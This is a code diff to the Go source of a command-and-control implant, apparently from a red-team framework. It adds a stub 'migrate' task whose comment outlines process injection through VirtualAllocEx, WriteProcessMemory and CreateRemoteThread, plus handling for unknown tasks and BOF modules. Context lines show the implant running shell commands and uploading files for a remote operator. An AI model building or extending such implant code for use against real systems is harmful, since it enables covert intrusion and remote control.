@@ -1027,6 +1027,19 @@ func executeTask(task map[string]interface{}) {
 		time.Sleep(500 * time.Millisecond)
 		// Terminate the implant process
 		os.Exit(0)
+	case "migrate":
+		if pidStr, ok := task["command"].(string); ok {
+			executeMigrate(taskID, pidStr)
+		} else if params, ok := task["parameters"].(map[string]interface{}); ok {
+			if pidVal, ok := params["pid"]; ok {
+				pidStr := fmt.Sprintf("%v", pidVal)
+				executeMigrate(taskID, pidStr)
+			} else {
+				sendResult("migrate", taskID, "Error: Process ID not provided in migrate task")
+			}
+		} else {
+			sendResult("migrate", taskID, "Error: Process ID not provided in migrate task")
+		}
 	case "module":
 		if moduleID, ok := task["module_id"].(string); ok {
 			executeModule(taskID, moduleID, task)
@@ -1047,6 +1060,11 @@ func executeTask(task map[string]interface{}) {
 				uploadFile(taskID, path, data)
 			}
 		}
+	default:
+		{{if .Debug}}
+		debugLog("Unknown task type: %s", taskType)
+		{{end}}
+		sendResult(taskType, taskID, fmt.Sprintf("Error: Unknown task type: %s", taskType))
 	}
 }
 
@@ -1058,6 +1076,25 @@ func executeShellCommand(taskID, cmd string) {
 	// Execute shell command and send result back
 	result := executeCommand(cmd)
 	sendResult("shell", taskID, result)
+}
+
+func executeMigrate(taskID, pidStr string) {
+	{{if .Debug}}
+	debugLog("Migrate command received: id=%s, pid=%s", taskID, pidStr)
+	{{end}}
+	
+	// Process migration is not yet implemented in Go implants
+	// Migration requires:
+	// 1. Generating shellcode for a new implant instance
+	// 2. Opening the target process with PROCESS_ALL_ACCESS
+	// 3. Allocating memory in the remote process (VirtualAllocEx)
+	// 4. Writing shellcode to remote memory (WriteProcessMemory)
+	// 5. Creating remote thread to execute shellcode (CreateRemoteThread)
+	// 6. Waiting for migration to complete
+	// 
+	// This feature requires significant Windows API integration and is planned for future implementation
+	sendResult("migrate", taskID, fmt.Sprintf("Error: Process migration is not yet implemented. Requested PID: %s\n"+
+		"Migration requires shellcode generation and process injection APIs that are not currently available in the Go implant.", pidStr))
 }
 
 func executeModule(taskID, moduleID string, task map[string]interface{}) {
@@ -1290,6 +1327,8 @@ func executeModule(taskID, moduleID string, task map[string]interface{}) {
 	var errorMsg string
 	if strings.Contains(moduleID, "csharp/") {
 		errorMsg = "Error: C# modules are not supported by Go implants. Only PowerShell and Python modules are currently supported."
+	} else if strings.Contains(moduleID, "bof/") || strings.HasSuffix(moduleID, ".o") {
+		errorMsg = "Error: BOF (Beacon Object File) modules are not supported by Go implants. BOFs require a COFF loader extension and are typically executed via Cobalt Strike or Sliver. Only PowerShell and Python modules are currently supported."
 	} else {
 		errorMsg = fmt.Sprintf("Error: Module type not supported (not PowerShell/Python and not embedded). Module: %s", moduleID)
 	}
